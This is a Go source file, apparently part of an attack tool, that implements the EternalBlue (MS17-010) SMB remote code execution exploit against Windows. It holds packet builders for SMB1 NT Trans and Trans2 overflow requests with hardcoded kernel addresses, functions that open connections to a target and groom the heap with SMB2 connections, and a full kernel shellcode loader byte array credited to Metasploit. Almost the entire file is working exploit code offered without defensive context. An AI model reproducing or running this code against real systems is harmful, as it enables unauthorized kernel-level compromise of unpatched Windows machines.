func writeNetBIOSNTTransHeader(buf *bytes.Buffer) error {
	// Message type
	buf.WriteByte(0x00)
	// Length
	buf.Write([]byte{0x00, 0x04, 0x38})
	return nil
}

// writeSMBNTTransHeader writes the SMB protocol header
func writeSMBNTTransHeader(buf *bytes.Buffer, treeID, userID uint16) error {
	// SMB identifier
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Command: NT Trans
	buf.WriteByte(0xA0)
	// NT status code
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Flags
	buf.WriteByte(0x18)
	// Flags2
	buf.Write([]byte{0x07, 0xC0})
	// Process ID high
	buf.Write([]byte{0x00, 0x00})
	// Signature1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Signature2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Reserved field
	buf.Write([]byte{0x00, 0x00})

	// Tree ID
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, treeID)
	buf.Write(treeIDBuf)

	// Process ID
	buf.Write([]byte{0xFF, 0xFE})

	// User ID
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)

	// Multiplex ID
	buf.Write([]byte{0x40, 0x00})
	return nil
}

// writeNTTransRequest writes the NT Trans request
func writeNTTransRequest(buf *bytes.Buffer) error {
	// Field count
	buf.WriteByte(0x14)
	// Maximum setup count
	buf.WriteByte(0x01)
	// Reserved field
	buf.Write([]byte{0x00, 0x00})
	// Total parameter count
	buf.Write([]byte{0x1E, 0x00, 0x00, 0x00})
	// Total data count
	buf.Write([]byte{0xd0, 0x03, 0x01, 0x00})
	// Maximum parameter count
	buf.Write([]byte{0x1E, 0x00, 0x00, 0x00})
	// Maximum data count
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Parameter count
	buf.Write([]byte{0x1E, 0x00, 0x00, 0x00})
	// Parameter offset
	buf.Write([]byte{0x4B, 0x00, 0x00, 0x00})
	// Data count
	buf.Write([]byte{0xd0, 0x03, 0x00, 0x00})
	// Data offset
	buf.Write([]byte{0x68, 0x00, 0x00, 0x00})
	// Setup count
	buf.WriteByte(0x01)
	// Unknown function
	buf.Write([]byte{0x00, 0x00})
	// Unknown NT transaction setup
	buf.Write([]byte{0x00, 0x00})
	// Byte count
	buf.Write([]byte{0xEC, 0x03})

	// NT parameters
	buf.Write(makeZero(0x1F))
	// Undocumented field
	buf.WriteByte(0x01)
	buf.Write(makeZero(0x03CD))

	return nil
}

// makeSMB1Trans2ExploitPacket creates the SMB1 Trans2 exploit data packet
func makeSMB1Trans2ExploitPacket(treeID, userID uint16, timeout int, typ string) []byte {
	// Calculate timeout value
	timeout = timeout*0x10 + 3
	buf := bytes.Buffer{}

	// Construct NetBIOS session service header
	writeNetBIOSTrans2Header(&buf)

	// Construct SMB protocol header
	writeSMBTrans2Header(&buf, treeID, userID)

	// Construct Trans2 request
	writeTrans2RequestHeader(&buf, timeout)

	// Add specific data based on type
	writeTrans2PayloadByType(&buf, typ)

	return buf.Bytes()
}

// writeNetBIOSTrans2Header writes the NetBIOS session service header
func writeNetBIOSTrans2Header(buf *bytes.Buffer) {
	// Message type
	buf.WriteByte(0x00)
	// Length
	buf.Write([]byte{0x00, 0x10, 0x35})
}

// writeSMBTrans2Header writes the SMB protocol header
func writeSMBTrans2Header(buf *bytes.Buffer, treeID, userID uint16) {
	// SMB identifier
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Trans2 request
	buf.WriteByte(0x33)
	// NT status code
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Flags
	buf.WriteByte(0x18)
	// Flags2
	buf.Write([]byte{0x07, 0xC0})
	// Process ID high
	buf.Write([]byte{0x00, 0x00})
	// Signature1 and 2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// Reserved field
	buf.Write([]byte{0x00, 0x00})

	// Tree ID
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, treeID)
	buf.Write(treeIDBuf)

	// Process ID
	buf.Write([]byte{0xFF, 0xFE})

	// User ID
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)

	// Multiplex ID
	buf.Write([]byte{0x40, 0x00})
}

// writeTrans2RequestHeader writes the Trans2 request header
func writeTrans2RequestHeader(buf *bytes.Buffer, timeout int) {
	// Field count
	buf.WriteByte(0x09)
	// Total parameter count
	buf.Write([]byte{0x00, 0x00})
	// Total data count
	buf.Write([]byte{0x00, 0x10})
	// Maximum parameter count
	buf.Write([]byte{0x00, 0x00})
	// Maximum data count
	buf.Write([]byte{0x00, 0x00})
	// Maximum setup count
	buf.WriteByte(0x00)
	// Reserved field
	buf.WriteByte(0x00)
	// Flags
	buf.Write([]byte{0x00, 0x10})
	// Timeout setting
	buf.Write([]byte{0x35, 0x00, 0xD0})
	buf.WriteByte(byte(timeout))
	// Reserved field
	buf.Write([]byte{0x00, 0x00})
	// Parameter count
	buf.Write([]byte{0x00, 0x10})
}

// writeTrans2PayloadByType writes the payload data based on type
func writeTrans2PayloadByType(buf *bytes.Buffer, typ string) {
	switch typ {
	case "exploit":
		writeExploitPayload(buf)
	case "zero":
		writeZeroPayload(buf)
	default:
		// Default padding
		buf.Write(bytes.Repeat([]byte{0x41}, 4096))
	}
}

// writeExploitPayload writes the exploit type payload
func writeExploitPayload(buf *bytes.Buffer) {
	// Overflow data
	buf.Write(bytes.Repeat([]byte{0x41}, 2957))
	buf.Write([]byte{0x80, 0x00, 0xA8, 0x00})

	// Fixed format data
	buf.Write(makeZero(0x10))
	buf.Write([]byte{0xFF, 0xFF})
	buf.Write(makeZero(0x06))
	buf.Write([]byte{0xFF, 0xFF})
	buf.Write(makeZero(0x16))

	// x86 address
	buf.Write([]byte{0x00, 0xF1, 0xDF, 0xFF})
	buf.Write(makeZero(0x08))
	buf.Write([]byte{0x20, 0xF0, 0xDF, 0xFF})

	// x64 address
	buf.Write([]byte{0x00, 0xF1, 0xDF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})

	// Trailing data
	writeExploitTrailingData(buf)
}

// writeExploitTrailingData writes the trailing data for exploit type
func writeExploitTrailingData(buf *bytes.Buffer) {
	buf.Write([]byte{0x60, 0x00, 0x04, 0x10})
	buf.Write(makeZero(0x04))
	buf.Write([]byte{0x80, 0xEF, 0xDF, 0xFF})
	buf.Write(makeZero(0x04))
	buf.Write([]byte{0x10, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.Write([]byte{0x18, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.Write(makeZero(0x10))
	buf.Write([]byte{0x60, 0x00, 0x04, 0x10})
	buf.Write(makeZero(0x0C))
	buf.Write([]byte{0x90, 0xFF, 0xCF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.Write(makeZero(0x08))
	buf.Write([]byte{0x80, 0x10})
	buf.Write(makeZero(0x0E))
	buf.Write([]byte{0x39, 0xBB})
	buf.Write(bytes.Repeat([]byte{0x41}, 965))
}

// writeZeroPayload writes the zero type payload
func writeZeroPayload(buf *bytes.Buffer) {
	buf.Write(makeZero(2055))
	buf.Write([]byte{0x83, 0xF3})
	buf.Write(bytes.Repeat([]byte{0x41}, 2039))
}

// makeSMB1EchoPacket creates the SMB1 Echo data packet
func makeSMB1EchoPacket(treeID, userID uint16) []byte {
	buf := bytes.Buffer{}

	// Construct NetBIOS session service header
	writeNetBIOSEchoHeader(&buf)

	// Construct SMB protocol header
	writeSMBEchoHeader(&buf, treeID, userID)

	// Construct Echo request
	writeEchoRequest(&buf)

	return buf.Bytes()
}

// writeNetBIOSEchoHeader writes the NetBIOS session service header
func writeNetBIOSEchoHeader(buf *bytes.Buffer) {
	// Message type
	buf.WriteByte(0x00)
	// Length
	buf.Write([]byte{0x00, 0x00, 0x31})
}

// writeSMBEchoHeader writes the SMB protocol header
func writeSMBEchoHeader(buf *bytes.Buffer, treeID, userID uint16) {
	// SMB identifier
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Echo command
	buf.WriteByte(0x2B)
	// NT status code
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Flags
	buf.WriteByte(0x18)
	// Flags2
	buf.Write([]byte{0x07, 0xC0})
	// Process ID high
	buf.Write([]byte{0x00, 0x00})
	// Signature1 and 2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// Reserved field
	buf.Write([]byte{0x00, 0x00})

	// Tree ID
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, treeID)
	buf.Write(treeIDBuf)

	// Process ID
	buf.Write([]byte{0xFF, 0xFE})

	// User ID
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)

	// Multiplex ID
	buf.Write([]byte{0x40, 0x00})
}

// writeEchoRequest writes the Echo request
func writeEchoRequest(buf *bytes.Buffer) {
	// Field count
	buf.WriteByte(0x01)
	// Echo count
	buf.Write([]byte{0x01, 0x00})
	// Byte count
	buf.Write([]byte{0x0C, 0x00})
	// Echo data (IDS signature, can be empty)
	buf.Write([]byte{0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x00})
}

// smb1FreeHole creates the SMB1 memory release vulnerability connection
func smb1FreeHole(address string, start bool) (net.Conn, error) {
	// Establish TCP connection
	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("Failed to connect to target: %v", err)
	}

	// Connection status flag
	var ok bool
	defer func() {
		if !ok {
			_ = conn.Close()
		}
	}()

	// SMB protocol negotiation
	if err = smbClientNegotiate(conn); err != nil {
		return nil, fmt.Errorf("SMB protocol negotiation failed: %v", err)
	}

	// Set different parameters based on start/end flag
	var flags2, vcNum, nativeOS []byte
	if start {
		flags2 = []byte{0x07, 0xC0}
		vcNum = []byte{0x2D, 0x01}
		nativeOS = []byte{0xF0, 0xFF, 0x00, 0x00, 0x00}
	} else {
		flags2 = []byte{0x07, 0x40}
		vcNum = []byte{0x2C, 0x01}
		nativeOS = []byte{0xF8, 0x87, 0x00, 0x00, 0x00}
	}

	// Construct and send session data packet
	packet := makeSMB1FreeHoleSessionPacket(flags2, vcNum, nativeOS)
	if _, err = conn.Write(packet); err != nil {
		return nil, fmt.Errorf("Failed to send memory release session data packet: %v", err)
	}

	// Get response
	if _, _, err = smb1GetResponse(conn); err != nil {
		return nil, fmt.Errorf("Failed to get session response: %v", err)
	}

	ok = true
	return conn, nil
}

// makeSMB1FreeHoleSessionPacket creates the SMB1 memory release session data packet
func makeSMB1FreeHoleSessionPacket(flags2, vcNum, nativeOS []byte) []byte {
	buf := bytes.Buffer{}

	// Construct NetBIOS session service header
	writeNetBIOSFreeHoleHeader(&buf)

	// Construct SMB protocol header
	writeSMBFreeHoleHeader(&buf, flags2)

	// Construct session setup request
	writeSessionSetupFreeHoleRequest(&buf, vcNum, nativeOS)

	return buf.Bytes()
}

// writeNetBIOSFreeHoleHeader writes the NetBIOS session service header
func writeNetBIOSFreeHoleHeader(buf *bytes.Buffer) {
	// Message type
	buf.WriteByte(0x00)
	// Length
	buf.Write([]byte{0x00, 0x00, 0x51})
}

// writeSMBFreeHoleHeader writes the SMB protocol header
func writeSMBFreeHoleHeader(buf *bytes.Buffer, flags2 []byte) {
	// SMB identifier
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Session Setup AndX command
	buf.WriteByte(0x73)
	// NT status code
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Flags
	buf.WriteByte(0x18)
	// Flags2
	buf.Write(flags2)
	// Process ID high
	buf.Write([]byte{0x00, 0x00})
	// Signature1 and 2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// Reserved field
	buf.Write([]byte{0x00, 0x00})
	// Tree ID
	buf.Write([]byte{0x00, 0x00})
	// Process ID
	buf.Write([]byte{0xFF, 0xFE})
	// User ID
	buf.Write([]byte{0x00, 0x00})
	// Multiplex ID
	buf.Write([]byte{0x40, 0x00})
}

// writeSessionSetupFreeHoleRequest writes the session setup request
func writeSessionSetupFreeHoleRequest(buf *bytes.Buffer, vcNum, nativeOS []byte) {
	// Field count
	buf.WriteByte(0x0C)
	// No subsequent command
	buf.WriteByte(0xFF)
	// Reserved field
	buf.WriteByte(0x00)
	// AndX offset
	buf.Write([]byte{0x00, 0x00})
	// Maximum buffer size
	buf.Write([]byte{0x04, 0x11})
	// Maximum multiplex count
	buf.Write([]byte{0x0A, 0x00})
	// VC number
	buf.Write(vcNum)
	// Session key
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Security data length
	buf.Write([]byte{0x00, 0x00})
	// Reserved field
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Capabilities
	buf.Write([]byte{0x00, 0x00, 0x00, 0x80})
	// Byte count
	buf.Write([]byte{0x16, 0x00})
	// Native OS
	buf.Write(nativeOS)
	// Additional parameters
	buf.Write(makeZero(17))
}

// smb2Grooms creates multiple SMB2 connections
func smb2Grooms(address string, grooms int) ([]net.Conn, error) {
	// Create SMB2 header
	header := makeSMB2Header()

	var (
		conns []net.Conn
		ok    bool
	)

	// Close all connections on failure
	defer func() {
		if ok {
			return
		}
		for _, conn := range conns {
			_ = conn.Close()
		}
	}()

	// Establish multiple connections
	for i := 0; i < grooms; i++ {
		// Create TCP connection
		conn, err := net.DialTimeout("tcp", address, 10*time.Second)
		if err != nil {
			return nil, fmt.Errorf("Failed to connect to target: %v", err)
		}

		// Send SMB2 header
		if _, err = conn.Write(header); err != nil {
			return nil, fmt.Errorf("Failed to send SMB2 header: %v", err)
		}

		conns = append(conns, conn)
	}

	ok = true
	return conns, nil
}

const (
	packetMaxLen   = 4204 // Maximum packet length
	packetSetupLen = 497  // Packet setup length
)

// makeSMB2Header creates the SMB2 protocol header
func makeSMB2Header() []byte {
	buf := bytes.Buffer{}

	// SMB2 protocol identifier
	buf.Write([]byte{0x00, 0x00, 0xFF, 0xF7, 0xFE})
	buf.WriteString("SMB")

	// Fill remaining bytes
	buf.Write(makeZero(124))

	return buf.Bytes()
}

// makeSMB2Body creates the SMB2 protocol body
func makeSMB2Body(payload []byte) []byte {
	const packetMaxPayload = packetMaxLen - packetSetupLen // Calculate maximum payload length
	buf := bytes.Buffer{}

	// Write padding data
	writePaddingData(&buf)

	// Write KI_USER_SHARED_DATA address
	writeSharedDataAddresses(&buf)

	// Write payload address and related data
	writePayloadAddresses(&buf)

	// Write payload data
	buf.Write(payload)

	// Fill remaining space (can be randomly generated)
	buf.Write(makeZero(packetMaxPayload - len(payload)))

	return buf.Bytes()
}

// writePaddingData writes the padding data
func writePaddingData(buf *bytes.Buffer) {
	buf.Write(makeZero(0x08))
	buf.Write([]byte{0x03, 0x00, 0x00, 0x00})
	buf.Write(makeZero(0x1C))
	buf.Write([]byte{0x03, 0x00, 0x00, 0x00})
	buf.Write(makeZero(0x74))
}

// writeSharedDataAddresses writes the shared data addresses
func writeSharedDataAddresses(buf *bytes.Buffer) {
	// x64 address
	x64Address := []byte{0xb0, 0x00, 0xd0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	buf.Write(bytes.Repeat(x64Address, 2))
	buf.Write(makeZero(0x10))

	// x86 address
	x86Address := []byte{0xC0, 0xF0, 0xDF, 0xFF}
	buf.Write(bytes.Repeat(x86Address, 2))
	buf.Write(makeZero(0xC4))
}

// writePayloadAddresses writes the payload address and related data
func writePayloadAddresses(buf *bytes.Buffer) {
	// Payload address
	buf.Write([]byte{0x90, 0xF1, 0xDF, 0xFF})
	buf.Write(makeZero(0x04))
	buf.Write([]byte{0xF0, 0xF1, 0xDF, 0xFF})
	buf.Write(makeZero(0x40))

	// Additional data
	buf.Write([]byte{0xF0, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.Write(makeZero(0x08))
	buf.Write([]byte{0x00, 0x02, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})
	buf.WriteByte(0x00)
}

// makeZero creates a zero-filled byte slice of the specified size
func makeZero(size int) []byte {
	return bytes.Repeat([]byte{0}, size)
}

// loader is a loader for running user-mode shellcode in kernel mode
// Referenced from Metasploit-Framework:
// File: msf/external/source/sc/windows/multi_arch_kernel_queue_apc.asm
// Binary: modules/exploits/windows/smb/ms17_010_eternalblue.rb: def make_kernel_sc
var loader = [...]byte{
	0x31, 0xC9, 0x41, 0xE2, 0x01, 0xC3, 0xB9, 0x82, 0x00, 0x00, 0xC0, 0x0F, 0x32, 0x48, 0xBB, 0xF8,
	0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x89, 0x53, 0x04, 0x89, 0x03, 0x48, 0x8D, 0x05, 0x0A,
	0x00, 0x00, 0x00, 0x48, 0x89, 0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x0F, 0x30, 0xC3, 0x0F, 0x01, 0xF8,
	0x65, 0x48, 0x89, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x24, 0x25, 0xA8, 0x01,
	0x00, 0x00, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41,
	0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x6A, 0x2B, 0x65, 0xFF, 0x34, 0x25, 0x10,
	0x00, 0x00, 0x00, 0x41, 0x53, 0x6A, 0x33, 0x51, 0x4C, 0x89, 0xD1, 0x48, 0x83, 0xEC, 0x08, 0x55,
	0x48, 0x81, 0xEC, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8D, 0xAC, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48,
	0x89, 0x9D, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xBD, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xB5,
	0xD0, 0x00, 0x00, 0x00, 0x48, 0xA1, 0xF8, 0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x89,
	0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x48, 0x31, 0xDB, 0xFF, 0xCB, 0x48, 0x21, 0xD8, 0xB9, 0x82, 0x00,
	0x00, 0xC0, 0x0F, 0x30, 0xFB, 0xE8, 0x38, 0x00, 0x00, 0x00, 0xFA, 0x65, 0x48, 0x8B, 0x24, 0x25,
	0xA8, 0x01, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x78, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,
	0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58, 0x65,
	0x48, 0x8B, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x0F, 0x01, 0xF8, 0xFF, 0x24, 0x25, 0xF8, 0x0F,
	0xD0, 0xFF, 0x56, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x53, 0x55, 0x48, 0x89, 0xE5,
	0x66, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x8D, 0x35, 0xE3, 0xFF, 0xFF, 0xFF, 0x65,
	0x4C, 0x8B, 0x3C, 0x25, 0x38, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x7F, 0x04, 0x49, 0xC1, 0xEF, 0x0C,
	0x49, 0xC1, 0xE7, 0x0C, 0x49, 0x81, 0xEF, 0x00, 0x10, 0x00, 0x00, 0x49, 0x8B, 0x37, 0x66, 0x81,
	0xFE, 0x4D, 0x5A, 0x75, 0xEF, 0x41, 0xBB, 0x5C, 0x72, 0x11, 0x62, 0xE8, 0x18, 0x02, 0x00, 0x00,
	0x48, 0x89, 0xC6, 0x48, 0x81, 0xC6, 0x08, 0x03, 0x00, 0x00, 0x41, 0xBB, 0x7A, 0xBA, 0xA3, 0x30,
	0xE8, 0x03, 0x02, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x39, 0xF0, 0x77, 0x11, 0x48, 0x8D, 0x90,
	0x00, 0x05, 0x00, 0x00, 0x48, 0x39, 0xF2, 0x72, 0x05, 0x48, 0x29, 0xC6, 0xEB, 0x08, 0x48, 0x8B,
	0x36, 0x48, 0x39, 0xCE, 0x75, 0xE2, 0x49, 0x89, 0xF4, 0x31, 0xDB, 0x89, 0xD9, 0x83, 0xC1, 0x04,
	0x81, 0xF9, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x8D, 0x66, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xF2, 0x89,
	0xCB, 0x41, 0xBB, 0x66, 0x55, 0xA2, 0x4B, 0xE8, 0xBC, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x75, 0xDB,
	0x49, 0x8B, 0x0E, 0x41, 0xBB, 0xA3, 0x6F, 0x72, 0x2D, 0xE8, 0xAA, 0x01, 0x00, 0x00, 0x48, 0x89,
	0xC6, 0xE8, 0x50, 0x01, 0x00, 0x00, 0x41, 0x81, 0xF9, 0xBF, 0x77, 0x1F, 0xDD, 0x75, 0xBC, 0x49,
	0x8B, 0x1E, 0x4D, 0x8D, 0x6E, 0x10, 0x4C, 0x89, 0xEA, 0x48, 0x89, 0xD9, 0x41, 0xBB, 0xE5, 0x24,
	0x11, 0xDC, 0xE8, 0x81, 0x01, 0x00, 0x00, 0x6A, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x8D,
	0x4E, 0x08, 0x49, 0xC7, 0x01, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x31, 0xC0, 0x4C, 0x89, 0xF2, 0x31,
	0xC9, 0x48, 0x89, 0x0A, 0x48, 0xF7, 0xD1, 0x41, 0xBB, 0x4B, 0xCA, 0x0A, 0xEE, 0x48, 0x83, 0xEC,
	0x20, 0xE8, 0x52, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x85, 0xC8, 0x00, 0x00, 0x00, 0x49, 0x8B,
	0x3E, 0x48, 0x8D, 0x35, 0xE9, 0x00, 0x00, 0x00, 0x31, 0xC9, 0x66, 0x03, 0x0D, 0xD7, 0x01, 0x00,
	0x00, 0x66, 0x81, 0xC1, 0xF9, 0x00, 0xF3, 0xA4, 0x48, 0x89, 0xDE, 0x48, 0x81, 0xC6, 0x08, 0x03,
	0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x8B, 0x11, 0x4C, 0x29, 0xE2, 0x51, 0x52, 0x48, 0x89, 0xD1,
	0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0x26, 0x40, 0x36, 0x9D, 0xE8, 0x09, 0x01, 0x00, 0x00, 0x48,
	0x83, 0xC4, 0x20, 0x5A, 0x59, 0x48, 0x85, 0xC0, 0x74, 0x18, 0x48, 0x8B, 0x80, 0xC8, 0x02, 0x00,
	0x00, 0x48, 0x85, 0xC0, 0x74, 0x0C, 0x48, 0x83, 0xC2, 0x4C, 0x8B, 0x02, 0x0F, 0xBA, 0xE0, 0x05,
	0x72, 0x05, 0x48, 0x8B, 0x09, 0xEB, 0xBE, 0x48, 0x83, 0xEA, 0x4C, 0x49, 0x89, 0xD4, 0x31, 0xD2,
	0x80, 0xC2, 0x90, 0x31, 0xC9, 0x41, 0xBB, 0x26, 0xAC, 0x50, 0x91, 0xE8, 0xC8, 0x00, 0x00, 0x00,
	0x48, 0x89, 0xC1, 0x4C, 0x8D, 0x89, 0x80, 0x00, 0x00, 0x00, 0x41, 0xC6, 0x01, 0xC3, 0x4C, 0x89,
	0xE2, 0x49, 0x89, 0xC4, 0x4D, 0x31, 0xC0, 0x41, 0x50, 0x6A, 0x01, 0x49, 0x8B, 0x06, 0x50, 0x41,
	0x50, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0xAC, 0xCE, 0x55, 0x4B, 0xE8, 0x98, 0x00, 0x00, 0x00,
	0x31, 0xD2, 0x52, 0x52, 0x41, 0x58, 0x41, 0x59, 0x4C, 0x89, 0xE1, 0x41, 0xBB, 0x18, 0x38, 0x09,
	0x9E, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE9, 0x41, 0xBB, 0x22, 0xB7, 0xB3, 0x7D, 0xE8,
	0x74, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD9, 0x41, 0xBB, 0x0D, 0xE2, 0x4D, 0x85, 0xE8, 0x66, 0x00,
	0x00, 0x00, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5E,
	0xC3, 0xE9, 0xB5, 0x00, 0x00, 0x00, 0x4D, 0x31, 0xC9, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D,
	0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xEC, 0xC3, 0x31, 0xD2,
	0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x12,
	0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x45, 0x31, 0xC9, 0x31, 0xC0, 0xAC, 0x3C,
	0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xEE, 0x45, 0x39,
	0xD9, 0x75, 0xDA, 0x4C, 0x8B, 0x7A, 0x20, 0xC3, 0x4C, 0x89, 0xF8, 0x41, 0x51, 0x41, 0x50, 0x52,
	0x51, 0x56, 0x48, 0x89, 0xC2, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00,
	0x00, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0x48,
	0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0xE8, 0x78, 0xFF, 0xFF, 0xFF, 0x45, 0x39,
	0xD9, 0x75, 0xEC, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48,
	0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x5E, 0x59,
	0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5B, 0x41, 0x53, 0xFF, 0xE0, 0x56, 0x41, 0x57, 0x55, 0x48,
	0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0xDA, 0x16, 0xAF, 0x92, 0xE8, 0x4D, 0xFF, 0xFF,
	0xFF, 0x31, 0xC9, 0x51, 0x51, 0x51, 0x51, 0x41, 0x59, 0x4C, 0x8D, 0x05, 0x1A, 0x00, 0x00, 0x00,
	0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0x46, 0x45, 0x1B, 0x22, 0xE8, 0x68, 0xFF, 0xFF, 0xFF,
	0x48, 0x89, 0xEC, 0x5D, 0x41, 0x5F, 0x5E, 0xC3,
}
